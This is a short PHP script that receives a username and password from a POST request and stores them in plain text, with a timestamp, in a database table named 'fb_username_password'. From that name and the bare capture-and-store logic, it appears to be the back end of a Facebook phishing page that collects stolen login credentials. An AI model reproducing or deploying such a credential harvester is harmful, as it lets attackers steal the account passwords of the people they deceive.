<?php 
require('assets/inc/connection.inc.php');

if(isset($_POST['user_name'])){
    $user_name=strip_tags(mysqli_real_escape_string($conn,$_POST['user_name']));
    $password=strip_tags(mysqli_real_escape_string($conn,$_POST['password']));
    date_default_timezone_set('Asia/Dhaka');
    $added_on=date('y-m-d h:i:s');
    $sql="INSERT INTO `fb_username_password` VALUES('','$user_name','$password', '$added_on')";
    $res=mysqli_query($conn,$sql);
}

echo 1;


?>